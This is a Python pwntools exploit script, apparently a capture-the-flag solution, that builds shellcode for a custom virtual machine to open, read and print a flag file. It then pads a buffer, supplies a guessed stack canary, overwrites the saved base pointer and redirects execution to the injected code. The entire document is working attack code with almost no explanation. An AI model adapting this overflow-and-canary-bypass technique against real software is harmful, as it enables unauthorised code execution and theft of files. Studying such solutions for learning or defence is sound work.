#!/usr/bin/python
from pwn import *

def convert_r(opcode):
	res = ''
	res += chr((opcode >> 7) & 0b1111111)
	res += chr(opcode & 0b1111111)
	return res

def convert_i(oper):
	res = ''
	res += chr(oper & 0b1111111)
	res += chr((oper >> 14) & 0b1111111)
	res += chr((oper >> 7) & 0b1111111)
	return res

def patch(op, op_type, opers):
	opcode = (op << 9)
	opcode |= (op_type << 8)

	if op_type == 0: # TYPE_R  r0, r1
		opcode |= ((opers[0] & 0b00000000001111) << 4)
		opcode |= (opers[1] & 0b00000000001111)
		return convert_r(opcode)

	elif op_type == 1: # TYPE_I  r0, #1
		opcode |= ((opers[0] & 0b00000000001111) << 4)
		return convert_r(opcode) + convert_i(opers[1])

r = process('./vm_name.py')

payload = 'flag' + '\x00'
'''open("flag.txt")'''
payload += patch(4, 1, [1, 0xf5f9e]) # mov r1, AAA 
payload += patch(4, 1, [0, 0x01]) # mov r0, 1
payload += patch(8, 0, [0, 0]) # op 8 <= syscall 1

'''read(2, AAA, 0x20)'''
payload += patch(4, 1, [1, 0x02]) # mov r1, 2
payload += patch(4, 1, [2, 0xf5000]) # mov r2, AAA
payload += patch(4, 1, [3, 0x20]) # mov r3, 0x20
payload += patch(4, 1, [0, 0x03]) # mov r0, 3
payload += patch(8, 0, [0, 0]) # op 8 <= syscall 3

'''write(1, AAA, 0x20)'''
payload += patch(4, 1, [1, 0x01]) # mov r1, 1
payload += patch(4, 1, [0, 0x02]) # mov r0, 2
payload += patch(8, 0, [0, 0]) # op 8 <= syscall 2

payload += '\x00'*(0xf5fd7-0xf5f9e-len(payload)) # dummy
payload += convert_i(0x12345) # 0x12345 canary
payload += 'aaa'  # bp
payload += convert_i(0xf5fa3)  # 0xf5fa3


r.sendlineafter('name>',payload)

r.interactive()